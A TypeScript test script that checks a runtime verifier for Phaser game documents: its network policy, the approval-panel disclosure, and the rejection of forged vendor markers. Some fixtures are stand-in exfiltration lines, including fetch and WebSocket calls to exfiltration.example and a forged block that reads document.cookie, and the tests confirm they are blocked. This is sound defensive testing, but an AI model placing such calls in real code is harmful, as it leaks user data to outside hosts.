/**
 * Real-browser checks for the server-side runtime verifier.
 *
 *   pnpm verify:runtime
 *
 * Confirms that a working Phaser scene passes and that a scene throwing at
 * runtime is rejected — the failure mode that structural HTML validation and
 * `node --check` cannot see.
 *
 * Two engine policies, both measured (KI-53):
 *
 *   - A document that carries the engine the product vendors is verified with no
 *     remote origin granted at all. That case runs with no egress, and it is the
 *     proof that a self-contained artifact needs nothing from a third party.
 *   - A document that still asks the approved CDN for its engine is verified
 *     under the older allowlist, and the case that machine hits when the CDN
 *     cannot answer is still refused *and says which host it could not reach*.
 *
 * Exit codes: 0 passed, 1 a verifier defect, 2 the environment cannot run the
 * reachable-engine case because the approved CDN is unreachable. A blocked
 * environment must not be reported as a product failure. The self-contained
 * cases above still ran in that situation, and the report says which cases did.
 */
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { dependencyDisclosure } from '../apps/server/src/forge/dependencies.js';
import {
  checkGameRuntime,
  isAllowedRuntimeRequest,
  runtimeNetworkPolicy,
} from '../apps/server/src/forge/runtime-check.js';
import {
  unvendorScripts,
  vendoredScriptIntegrityIssues,
  vendorGapUrls,
  vendorMarkerTextIssues,
  vendorScripts,
} from '../apps/server/src/forge/vendored-scripts.js';

const CDN = 'https://cdn.jsdelivr.net/npm/phaser@3.80.1/dist/phaser.min.js';
/**
 * The approved host on port 1. The allowlist matches scheme and hostname only,
 * so the verifier permits this load and hands it to the browser, which refuses
 * to attempt an unsafe port at all. That is a deterministic, no-egress way to
 * produce "a load the allowlist permitted came back failed" — what matters for
 * the verifier's report is that a permitted load failed, not which reason the
 * network layer gave, and a real no-egress machine shows the same shape with a
 * different reason string (`ERR_NAME_NOT_RESOLVED`, `ERR_CONNECTION_RESET`).
 */
const CDN_PERMITTED_AND_FAILED = 'https://cdn.jsdelivr.net:1/npm/phaser@3.80.1/dist/phaser.min.js';

function game(scene: string, engine = CDN): string {
  return `<!doctype html><html><head>
<script src="${engine}"></script></head><body><div id="game"></div>
<script>
new Phaser.Game({ type: Phaser.AUTO, width: 480, height: 320, parent: 'game', backgroundColor: '#ffe08a',
  scene: { create() { const g = this.add.graphics(); g.fillStyle(0xff5d5d, 1); g.fillRect(20, 20, 120, 80); ${scene} } } });
</script></body></html>`;
}

/**
 * The same game, with arbitrary engine tag markup. The tag forms under test have to
 * live inside a real game document: what is being measured is that a document the
 * product refuses to rewrite still loads its engine and still renders.
 */
function gameWithTag(
  tagMarkup: string,
  scene = 'this.add.text(40, 200, "ok", { color: "#222" });',
): string {
  return `<!doctype html><html><head>
${tagMarkup}</head><body><div id="game"></div>
<script>
new Phaser.Game({ type: Phaser.AUTO, width: 480, height: 320, parent: 'game', backgroundColor: '#ffe08a',
  scene: { create() { const g = this.add.graphics(); g.fillStyle(0xff5d5d, 1); g.fillRect(20, 20, 120, 80); ${scene} } } });
</script></body></html>`;
}

const checks: string[] = [];
/** Machine-readable record of what this gate measured, for the status document. */
const policies: Record<string, Record<string, unknown>> = {};
const measured: Record<string, unknown> = { policies, checks };
const evidenceDir = join(
  process.cwd(),
  'test-results',
  'runtime',
  new Date().toISOString().slice(0, 16).replace(/[-:]/g, '').replace('T', '-'),
);

function pass(what: string, detail = ''): void {
  checks.push(what);
  console.log(`  ok  ${what}${detail ? ` (${detail})` : ''}`);
}

function writeReport(status: string, extra: Record<string, unknown> = {}): void {
  mkdirSync(evidenceDir, { recursive: true, mode: 0o700 });
  writeFileSync(
    join(evidenceDir, 'report.json'),
    `${JSON.stringify({ status, checks, measured, ...extra }, null, 2)}\n`,
  );
  console.log(`evidence: ${join(evidenceDir, 'report.json')}`);
}

/** The same scene, with the engine the product vendors sitting in the document. */
function selfContainedGame(scene: string): string {
  const outcome = vendorScripts(game(scene));
  if (outcome.applied.length !== 1) {
    throw new Error(`the fixture game was not vendored: ${outcome.gaps[0]?.reason ?? 'no reason'}`);
  }
  return outcome.html;
}

async function main() {
  // The engine is only reachable if the verifier lets the request out at all.
  if (!isAllowedRuntimeRequest(CDN)) throw new Error('the approved CDN is not allowlisted');
  if (!isAllowedRuntimeRequest(CDN_PERMITTED_AND_FAILED)) {
    throw new Error('the unreachable-port stand-in is not treated as an allowed origin');
  }

  /*
   * 0. A document that carries its own engine. This runs with no egress at all:
   *    the verifier grants no remote origin to a document that needs none, so a
   *    pass here is the proof that the artifact is reproducible without a third
   *    party's CDN, and a blocked pass is the proof that nothing else crept out.
   */
  if (isAllowedRuntimeRequest(CDN, 'vendored')) {
    throw new Error('a self-contained document was granted a remote origin');
  }
  if (runtimeNetworkPolicy(selfContainedGame('this.add.text(1, 1, "x", {});')) !== 'vendored') {
    throw new Error('a document carrying the pinned engine was not read as self-contained');
  }

  const selfContained = await checkGameRuntime(
    selfContainedGame('this.add.text(40, 200, "ok", { color: "#222" });'),
    30_000,
  );
  policies.self_contained = {
    policy: selfContained.network_policy,
    gaps: selfContained.vendor_gaps,
    blocked: selfContained.blocked,
    remote_failures: selfContained.remote_failures,
  };
  if (selfContained.network_policy !== 'vendored') {
    throw new Error(
      `a self-contained game was verified under ${String(selfContained.network_policy)} instead of no-network`,
    );
  }
  if (!selfContained.ok) {
    throw new Error(
      `a game carrying its own engine failed with no network available: ${selfContained.errors.join(' | ')}`,
    );
  }
  if (!selfContained.canvas) throw new Error('a self-contained game reported no canvas');
  if (selfContained.blocked.length > 0) {
    throw new Error(
      `a self-contained game reached for the network: ${selfContained.blocked.join(', ')}`,
    );
  }
  if (selfContained.remote_failures.length > 0) {
    throw new Error(
      `a self-contained game reported a failed remote load: ${selfContained.remote_failures.join(', ')}`,
    );
  }
  pass(
    'a game carrying the vendored engine boots with no remote origin granted, and reaches for nothing',
    selfContained.browser ?? '',
  );

  /*
   * The same bytes, read the way the approval panel reads them (KI-74): the panel
   * has to say "this engine is carried" about the document the browser just
   * booted. If the disclosure and the browser disagree about whether a remote
   * origin was needed, the reviewer is being shown a different artifact.
   */
  const selfContainedHtml = selfContainedGame('this.add.text(40, 200, "ok", { color: "#222" });');
  const carried = dependencyDisclosure(selfContainedHtml);
  policies.self_contained_disclosure = {
    network_policy: carried.network_policy,
    self_contained: carried.self_contained,
    rows: carried.dependencies.map((row) => [row.status, row.reason, row.library, row.version]),
  };
  if (carried.network_policy !== 'vendored' || !carried.self_contained) {
    throw new Error(
      'the disclosure did not read the carried-engine document as needing nothing remote',
    );
  }
  if (
    carried.dependencies.length !== 1 ||
    carried.dependencies[0]?.status !== 'bundled' ||
    carried.dependencies[0]?.library !== 'phaser' ||
    carried.dependencies[0]?.version !== '3.80.1'
  ) {
    throw new Error(
      `the panel would not name the carried engine: ${JSON.stringify(carried.dependencies)}`,
    );
  }
  pass(
    'the approval-panel disclosure names the carried engine, and nothing else, for a self-contained game',
    'phaser 3.80.1 bundled',
  );

  const selfContainedExfil = await checkGameRuntime(
    selfContainedGame('fetch("https://exfiltration.example/collect").catch(function () {});'),
    30_000,
  );
  if (selfContainedExfil.ok) {
    throw new Error('a self-contained scene phoning home passed verification');
  }
  if (!selfContainedExfil.blocked.some((url) => url.includes('exfiltration.example'))) {
    throw new Error('a self-contained scene remote request was not recorded as blocked');
  }
  pass('a game that carries its engine is granted no network at all, so phoning home is blocked');

  /*
   * The case a passed check used to hide: a self-contained game that reaches for
   * the network has that reach refused, and the panel must say so in the same
   * words the browser acted on. Here the reach is a literal URL, so the static
   * scan and the live refusal can be compared origin for origin in both
   * directions — a disclosure that under-reported it would fail this check.
   */
  const exfilHtml = selfContainedGame(
    'fetch("https://exfiltration.example/collect").catch(function () {});',
  );
  const exfilDisclosure = dependencyDisclosure(exfilHtml);
  const disclosedBlocked = exfilDisclosure.dependencies
    .filter((row) => row.status === 'blocked')
    .map((row) => row.origin ?? '');
  const browserBlocked = [...new Set(selfContainedExfil.blocked.map((url) => new URL(url).origin))];
  policies.exfil_disclosure = { disclosed: disclosedBlocked, browser: browserBlocked };
  if (disclosedBlocked.length === 0) {
    throw new Error('the approval panel would not have shown the reach verification refused');
  }
  for (const origin of browserBlocked) {
    if (!disclosedBlocked.includes(origin)) {
      throw new Error(`verification refused ${origin}, which the disclosure does not name`);
    }
  }
  for (const origin of disclosedBlocked) {
    if (!browserBlocked.includes(origin)) {
      throw new Error(`the disclosure names ${origin}, which verification did not refuse`);
    }
  }
  pass(
    'a refused remote reach is disclosed in the approval panel, naming the origins verification refused',
    browserBlocked.join(' '),
  );

  /*
   * A Phaser version the product does not vendor keeps its own reference and is
   * reported as a named gap rather than silently re-pointed at the pinned copy.
   */
  const unvendored = game(
    'this.add.text(40, 200, "ok", { color: "#222" });',
    CDN.replace('3.80.1', '3.55.0'),
  );
  const unvendoredGaps = vendorGapUrls(unvendored);
  policies.unvendored = {
    policy: runtimeNetworkPolicy(unvendored),
    gaps: unvendoredGaps,
  };
  if (runtimeNetworkPolicy(unvendored) !== 'cdn-allowlist') {
    throw new Error('a document that still needs the CDN was put on the no-network policy');
  }
  if (unvendoredGaps.length !== 1 || !unvendoredGaps[0]?.includes('3.55.0')) {
    throw new Error(
      `an unvendored Phaser version was not named by URL: ${JSON.stringify(unvendoredGaps)}`,
    );
  }
  const unvendoredCheck = await checkGameRuntime(unvendored, 20_000);
  if (unvendoredCheck.network_policy !== 'cdn-allowlist') {
    throw new Error(
      `the unvendored game was verified under ${String(unvendoredCheck.network_policy)}`,
    );
  }
  if ((unvendoredCheck.vendor_gaps ?? []).length !== 1) {
    throw new Error(
      `the runtime report did not carry the vendor gap: ${JSON.stringify(unvendoredCheck.vendor_gaps)}`,
    );
  }
  const unvendoredDisclosure = dependencyDisclosure(unvendored);
  policies.unvendored_disclosure = {
    network_policy: unvendoredDisclosure.network_policy,
    rows: unvendoredDisclosure.dependencies.map((row) => [
      row.status,
      row.reason,
      row.version,
      row.url,
    ]),
  };
  const gapRow = unvendoredDisclosure.dependencies.find(
    (row) => row.reason === 'version_outside_pin',
  );
  if (!gapRow) {
    throw new Error(
      `the panel would not name the engine version this product does not carry: ${JSON.stringify(unvendoredDisclosure.dependencies)}`,
    );
  }
  if (gapRow.status !== 'fetched' || gapRow.version !== '3.55.0') {
    throw new Error(
      `the unsupported engine was disclosed as ${gapRow.status} ${String(gapRow.version)}`,
    );
  }
  if (!unvendoredGaps.includes(gapRow.url)) {
    throw new Error(
      `the reference the panel would name is not the one the checker recorded: ${gapRow.url} vs ${unvendoredGaps.join(', ')}`,
    );
  }
  pass(
    'a Phaser version this product does not vendor keeps its reference and is reported as a gap',
    unvendoredGaps[0]?.slice(0, 72),
  );

  /*
   * 3c. Tag forms the product will not rewrite (KI-76/KI-77).
   *
   * A pinned reference is only swapped when the swap provably preserves the
   * document. A tag that carries an attribute the engine block cannot hold, a body
   * of its own, or an uppercase closing tag that a case-sensitive scanner reads
   * past, is left exactly as written and named as a gap — and the document still
   * has to work, because the browser reads these tags perfectly well. Refusing to
   * vendor is not refusing the artifact.
   */
  // The gap reason is prose written for a reviewer, so each form is paired with the
  // word that report has to contain: a gap that does not name what it refused is a
  // gap nobody can act on. The machine-readable code lives on the disclosure, and
  // the two must agree.
  const tagForms: Array<[string, string, string]> = [
    [
      'attribute',
      gameWithTag(`<script src="${CDN}" onload="window.__pinHandler = 1"></script>`),
      'onload',
    ],
    ['body', gameWithTag(`<script src="${CDN}">window.__engineBody = 1</script>`), 'body'],
    ['uppercase close', gameWithTag(`<script src="${CDN}"></SCRIPT>`), ''],
  ];
  const tagFormResults: Record<string, unknown> = {};
  for (const [label, document, expectedReason] of tagForms) {
    const outcome = vendorScripts(document);
    const gaps = vendorGapUrls(document);
    const disclosed = dependencyDisclosure(document);
    if (runtimeNetworkPolicy(document) !== 'cdn-allowlist') {
      throw new Error(`the ${label} engine tag was not read as a remote reference`);
    }
    if (label === 'uppercase close') {
      // A scanner that misses `</SCRIPT>` reads the engine as document text and
      // sees no reference at all: the document would be called self-contained while
      // it still asks a CDN for 1.18 MB.
      // Read on its own terms the reference is a gap; after vendoring it is not.
      // Asserting only the second would let a scanner that misses the tag "pass" by
      // seeing no reference at all.
      const gapsAfter = vendorGapUrls(outcome.html);
      if (outcome.applied.length !== 1 || gaps.length !== 1 || gapsAfter.length !== 0) {
        throw new Error(
          `an uppercase closing tag was not read as an engine reference: applied ${String(outcome.applied.length)}, gaps before ${JSON.stringify(gaps)}, after ${JSON.stringify(gapsAfter)}`,
        );
      }
      if (runtimeNetworkPolicy(outcome.html) !== 'vendored') {
        throw new Error('a document vendored from an uppercase closing tag was not self-contained');
      }
    } else {
      if (outcome.applied.length !== 0) {
        throw new Error(`the ${label} engine tag was rewritten anyway`);
      }
      if (gaps.length !== 1 || !gaps[0]?.includes('/npm/phaser@')) {
        throw new Error(`the ${label} engine tag left no named gap: ${JSON.stringify(gaps)}`);
      }
      if (!outcome.gaps[0]?.reason.includes(expectedReason)) {
        throw new Error(
          `the ${label} engine gap does not name what it refused: ${String(outcome.gaps[0]?.reason)}`,
        );
      }
      const disclosedRow = disclosed.dependencies.find((row) => row.origin === new URL(CDN).origin);
      if (disclosedRow?.reason !== 'tag_form_not_replaced') {
        throw new Error(
          `the ${label} engine tag was disclosed with reason ${String(disclosedRow?.reason)}`,
        );
      }
      if (disclosedRow.status !== 'fetched') {
        throw new Error(`the ${label} engine tag was disclosed as ${String(disclosedRow.status)}`);
      }
      // Whatever the author wrote beside the reference has to survive: an inline
      // handler dropped by a swap is a behaviour change nobody approved.
      if (label === 'attribute' && !outcome.html.includes('window.__pinHandler = 1')) {
        throw new Error('the attribute form was refused, yet the handler was still dropped');
      }
      if (label === 'body' && !outcome.html.includes('window.__engineBody = 1')) {
        throw new Error('the script body was discarded by vendoring');
      }
    }
    const run = await checkGameRuntime(document, 20_000);
    tagFormResults[label] = {
      applied: outcome.applied.length,
      gaps: gaps.map((url) => url.slice(0, 72)),
      ok: run.ok,
      policy: run.network_policy,
      reported_gaps: (run.vendor_gaps ?? []).length,
      disclosed: disclosed.dependencies.map((row) => [row.status, row.reason]),
    };
    if (!run.ok) {
      throw new Error(
        `the ${label} engine document failed runtime verification: ${JSON.stringify(run.errors).slice(0, 200)}`,
      );
    }
    if (run.network_policy !== 'cdn-allowlist') {
      throw new Error(
        `the ${label} engine document was verified under ${String(run.network_policy)}`,
      );
    }
    // The checker reports gaps for the bytes it was handed — the same bytes the
    // scan above counted. If the two ever differ, one of them is reading a
    // different document than the person is being asked to approve.
    if ((run.vendor_gaps ?? []).length !== gaps.length) {
      throw new Error(
        `the runtime report carried ${String((run.vendor_gaps ?? []).length)} gap(s) for a document whose scan found ${String(gaps.length)}`,
      );
    }
  }
  policies.tag_forms = tagFormResults;
  pass(
    'an engine tag the product cannot swap preserves the author\u2019s attributes and body, and is named as a gap',
    'attribute + body, both still loading their engine',
  );
  pass(
    'an uppercase closing tag is read as the engine reference it is, not as document text',
    'vendored, gap-free',
  );

  /*
   * 3d. Vendor delimiters are a format this product writes, not a claim an author
   *     can make. A document that writes the markers itself must not be trusted as
   *     carrying the engine: the payload behind forged delimiters is model code and
   *     stays visible in the bytes a person reviews.
   */
  const forged = game('this.add.text(40, 200, "ok", { color: "#222" });').replace(
    `<script src="${CDN}"></script>`,
    '<script data-forge-vendor="phaser@3.80.1">window.__smuggled = document.cookie;</script>',
  );
  const forgedOutcome = vendorScripts(forged);
  const forgedIntegrity = vendoredScriptIntegrityIssues(forgedOutcome.html);
  const forgedSource = unvendorScripts(forgedOutcome.html);
  // The other shape of the same claim: the delimiters written out as comment text.
  // Nothing in a source document may write the product's own framing, because the
  // source view collapses that framing — so anything inside it would ship unseen.
  const forgedComment = vendorMarkerTextIssues(
    `<!-- forge-vendor:phaser@3.80.1 start | sha256 ${'0'.repeat(64)} -->\n<script>window.__alsoSmuggled = 1;</script>\n<!-- forge-vendor:phaser@3.80.1 end -->`,
  );
  policies.forged_marker = {
    applied: forgedOutcome.applied.length,
    gaps: vendorGapUrls(forgedOutcome.html).map((url) => url.slice(0, 72)),
    integrity_issues: forgedIntegrity.map((issue) => issue.slice(0, 90)),
    comment_marker_issues: forgedComment.map((issue) => issue.slice(0, 90)),
    payload_visible_in_source: forgedSource.includes('window.__smuggled'),
  };
  if (forgedOutcome.applied.length !== 0) {
    throw new Error('a document wrote its own vendor block and the product trusted it');
  }
  if (forgedIntegrity.length === 0) {
    throw new Error('a forged vendor marker was accepted as the product\u2019s own engine block');
  }
  if (!forgedSource.includes('window.__smuggled')) {
    throw new Error('a payload behind a forged marker was hidden from the source view');
  }
  if (forgedComment.length === 0) {
    throw new Error('vendor marker text in a source document was not reported as invalid source');
  }
  pass(
    'a document that writes the vendor markers itself is not trusted as carrying the engine',
    `${forgedIntegrity.length} marked script(s) refused, ${String(forgedComment.length)} marker text(s) invalid`,
  );

  // 1. Engine permitted but unreachable: the artifact must be refused, and the
  //    report must name the host rather than leaving "Phaser is not defined" as
  //    the only clue. This case runs with no egress at all.
  const offlineHtml = game(
    'this.add.text(40, 200, "ok", { color: "#222" });',
    CDN_PERMITTED_AND_FAILED,
  );
  const offline = await checkGameRuntime(offlineHtml, 15_000);
  console.log('engine load refused:', JSON.stringify(offline.errors));
  if (offline.ok) throw new Error('a game whose engine could not load passed runtime verification');
  if (offline.canvas) throw new Error('a game with no engine reported a canvas');
  if (offline.remote_failures.length === 0) {
    throw new Error('a permitted load that the network refused was not named as a remote failure');
  }
  if (!offline.remote_failures.some((line) => line.includes('https://cdn.jsdelivr.net'))) {
    throw new Error(
      `the refusal does not name the approved CDN origin: ${offline.remote_failures.join(' | ')}`,
    );
  }
  if (!offline.errors.some((line) => line.includes('https://cdn.jsdelivr.net'))) {
    throw new Error('the user-visible errors do not name the host the game could not reach');
  }
  if (offline.errors.some((line) => line.includes('phaser.min.js'))) {
    throw new Error(`the report leaked the engine path: ${offline.errors.join(' | ')}`);
  }
  if (offline.blocked.length > 0) {
    throw new Error(
      `the unreachable-approved-host case reported blocked requests: ${offline.blocked.join(', ')}`,
    );
  }
  const offlineDisclosure = dependencyDisclosure(offlineHtml);
  const permittedOrigins = new Set(offlineDisclosure.granted_origins);
  const disclosedFetched = new Set(
    offlineDisclosure.dependencies
      .filter((row) => row.status === 'fetched')
      .map((row) => row.origin ?? ''),
  );
  policies.offline_disclosure = {
    network_policy: offlineDisclosure.network_policy,
    fetched: [...disclosedFetched],
    granted: offlineDisclosure.granted_origins,
  };
  for (const line of offline.remote_failures) {
    const origin = (line.match(/https?:\/\/[^\s)]+/) ?? [''])[0];
    if (origin !== '' && !disclosedFetched.has(origin)) {
      throw new Error(
        `the browser failed a load from ${origin}, which the panel would not have shown as fetched: ${line}`,
      );
    }
  }
  // Compared by host, not exact origin: this stand-in runs on port 1 and an
  // origin keeps the port, while the policy matches host alone. A disclosure
  // naming `https://cdn.jsdelivr.net:1` is the same engine being permitted.
  if (
    ![...disclosedFetched].some((origin) => origin.includes('cdn.jsdelivr.net')) ||
    !permittedOrigins.has('https://cdn.jsdelivr.net')
  ) {
    throw new Error(
      `the engine the policy permitted was not disclosed as a fetched dependency: ${JSON.stringify([
        ...disclosedFetched,
      ])}`,
    );
  }

  if (offlineDisclosure.dependencies.some((row) => row.status === 'blocked')) {
    throw new Error(
      'a load the policy permitted was disclosed as blocked, conflating two refusals',
    );
  }
  pass(
    'a game whose engine cannot load is refused, and the refusal names the approved CDN origin',
    offline.remote_failures[0]?.slice(0, 96),
  );
  pass(
    'an engine the policy permits is disclosed as fetched, never as blocked, whichever way the network answered',
  );

  // 2. Reachable engine: the first case that needs the CDN to answer, and the
  //    switch for everything below it. If the CDN does not answer, that is an
  //    environment limit and the run says so instead of reporting a verifier
  //    defect — the remaining cases all assume the engine actually loaded.
  const good = await checkGameRuntime(game('this.add.text(40, 200, "ok", { color: "#222" });'));
  policies.cdn_dependent = {
    policy: good.network_policy,
    blocked: good.blocked,
    remote_failures: good.remote_failures,
  };
  if (good.network_policy !== 'cdn-allowlist') {
    throw new Error(
      `a document that asks the CDN for its engine was verified under ${String(good.network_policy)}`,
    );
  }
  if (!good.ok) {
    if (good.remote_failures.length > 0) {
      console.log(
        '\nBLOCKED: the approved CDN is unreachable from this machine, so the reachable-engine case cannot be measured.',
      );
      console.log(`  ${good.remote_failures.join('\n  ')}`);
      console.log(
        '  cases skipped because they need the engine to load: unapproved origin, unapproved',
      );
      console.log('  WebSocket, scene-that-throws, and the working-scene control itself.');
      console.log(`offline checks that did run: ${checks.length}`);
      writeReport('BLOCKED: approved CDN unreachable', {
        blocked_reason: good.remote_failures.join(' | '),
      });
      process.exit(2);
    }
    throw new Error(
      `valid Phaser scene did not pass runtime verification: ${good.errors.join(' | ')}`,
    );
  }
  const goodDisclosure = dependencyDisclosure(
    game('this.add.text(40, 200, "ok", { color: "#222" });'),
  );
  policies.cdn_dependent_disclosure = {
    network_policy: goodDisclosure.network_policy,
    rows: goodDisclosure.dependencies.map((row) => [
      row.status,
      row.reason,
      row.origin,
      row.version,
    ]),
  };
  if (
    goodDisclosure.dependencies.length !== 1 ||
    goodDisclosure.dependencies[0]?.status !== 'fetched' ||
    goodDisclosure.dependencies[0]?.origin !== 'https://cdn.jsdelivr.net'
  ) {
    throw new Error(
      `a CDN-dependent game would not be disclosed as fetching its engine: ${JSON.stringify(goodDisclosure.dependencies)}`,
    );
  }
  if (good.blocked.length > 0) throw new Error('valid scene had requests blocked');
  if (good.remote_failures.length > 0) {
    throw new Error(
      `a scene that rendered reported a failed load: ${good.remote_failures.join(' | ')}`,
    );
  }
  pass(
    'a document that still asks the approved CDN for its engine loads it under the allowlist',
    good.browser ?? '',
  );

  // 3. A scene that phones home is still refused, and a request the allowlist
  //    *rejected* must never be dressed up as a permitted load that failed.
  const exfiltration = await checkGameRuntime(
    game('fetch("https://exfiltration.example/collect").catch(function () {});'),
  );
  if (exfiltration.ok) throw new Error('a scene calling an unapproved origin passed verification');
  if (!exfiltration.blocked.some((url) => url.includes('exfiltration.example'))) {
    throw new Error('unapproved request was not recorded as blocked');
  }
  if (exfiltration.remote_failures.length > 0) {
    throw new Error(
      `a blocked host was reported as a permitted failure: ${exfiltration.remote_failures.join(' | ')}`,
    );
  }
  pass('an unapproved origin is blocked, and blocking is never reported as a permitted failure');

  const websocket = await checkGameRuntime(
    game(
      'try { var s = new WebSocket("wss://exfiltration.example/socket"); s.onerror = function () {}; } catch (error) {}',
    ),
  );
  if (websocket.ok) throw new Error('a scene opening an unapproved WebSocket passed verification');
  if (!websocket.blocked.some((url) => url.includes('wss://exfiltration.example'))) {
    throw new Error('unapproved WebSocket was not recorded as blocked');
  }
  pass('an unapproved WebSocket is closed and recorded');

  // 4. A scene whose engine loads and then throws is refused for throwing,
  //    not for its network.
  const broken = await checkGameRuntime(game('g.fillStar(80, 80, 5, 30, 30);'));
  if (broken.ok) throw new Error('broken Phaser scene passed runtime verification');
  if (broken.remote_failures.length > 0) {
    throw new Error(
      `an engine failure was reported for a scene whose engine loaded: ${broken.remote_failures.join(' | ')}`,
    );
  }
  pass('a scene that throws after the engine loads is refused, without blaming the CDN');

  measured.offline_case = {
    remote_failures: offline.remote_failures,
    errors: offline.errors,
    policy: offline.network_policy,
  };
  writeReport(`PASS (${String(checks.length)} checks)`);
  console.log(`runtime verification: PASS (${checks.length} checks)`);
}

main().catch((error) => {
  console.error(error);
  writeReport('FAILED', { failure: error instanceof Error ? error.message : String(error) });
  process.exit(1);
});
